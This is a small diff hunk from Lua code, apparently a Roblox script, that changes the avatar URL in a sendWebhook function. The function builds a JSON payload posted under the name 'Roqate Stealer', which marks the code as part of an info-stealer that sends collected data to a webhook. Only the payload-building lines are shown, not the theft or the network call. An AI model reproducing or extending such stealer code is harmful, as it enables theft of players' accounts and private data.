@@ -46,7 +46,7 @@ local function sendWebhook(data)
         content = data.content,
         embeds = data.embeds,
         username = "Roqate Stealer",
-        avatar_url = "https://i.imgur.com/6JqX9yP.png"
+        avatar_url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
     }
 
     local json = HttpService:JSONEncode(body)
